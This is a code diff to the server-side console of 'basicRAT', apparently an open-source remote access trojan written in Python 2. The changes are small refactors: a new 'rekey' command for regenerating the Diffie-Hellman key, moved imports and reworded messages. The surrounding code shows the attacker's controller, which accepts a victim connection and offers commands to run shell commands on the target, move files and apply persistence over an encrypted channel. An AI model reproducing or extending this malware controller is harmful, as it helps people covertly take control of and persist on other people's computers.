@@ -10,15 +10,10 @@ import argparse
 import readline
 import socket
 import struct
-import time
 import sys
+import time
 
 from core import common
-from core.crypto import diffiehellman
-
-# temporary
-from core.crypto import AES_encrypt as encrypt
-from core.crypto import AES_decrypt as decrypt
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -37,6 +32,7 @@ HELP_TEXT = '''
 download <file> - Download a file.
 help            - Show this help menu.
 persistence     - Apply persistence mechanism.
+rekey           - Regenerate crypto key.
 run <command>   - Execute a command on the target.
 upload <file>   - Upload a file.
 quit            - Gracefully kill client and server.
@@ -61,6 +57,7 @@ def main():
     crypto  = args['crypto']
 
     if crypto == 'AES':
+        from core.crypto import diffiehellman
         from core.crypto import AES_encrypt as encrypt
         from core.crypto import AES_decrypt as decrypt
 
@@ -80,14 +77,16 @@ def main():
 
     s.listen(10)
     conn, addr = s.accept()
+    
     DHKEY = diffiehellman(conn, server=True)
-    #print binascii.hexlify(DHKEY) #debug: confirm DHKEY matches
+    # debug: confirm DHKEY matches
+    # print binascii.hexlify(DHKEY)
     
     while True:
-        prompt = raw_input('[{0}] basicRAT> '.format(addr[0])).rstrip()
+        prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()
 
-        # allow no-op
-        if not prompt: 
+        # allow noop
+        if not prompt:
             continue
 
         # seperate prompt into command and action
@@ -122,13 +121,11 @@ def main():
                         res = conn.recv(datasize)
                         f.write(decrypt(res, DHKEY))
                         datasize = struct.unpack("!I", conn.recv(4))[0]
-                   
-                    
+                        
         # regenerate DH key (dangerous! may cause connection loss!)
         # available in case a fallback occurs or you suspect eavesdropping
         elif cmd == 'rekey':
             DHKEY = diffiehellman(conn, server=True)
-            #print binascii.hexlify(DHKEY) #debug
             
         # results of persistence
         elif cmd == 'persistence':
@@ -137,8 +134,7 @@ def main():
             print decrypt(recv_data, DHKEY)
 
         else:
-            print "Invalid command"
-            print "Type 'help' to get a list of all commands"
+            print 'Invalid command, type "help" to see a list of commands.'
 
 
 if __name__ == '__main__':
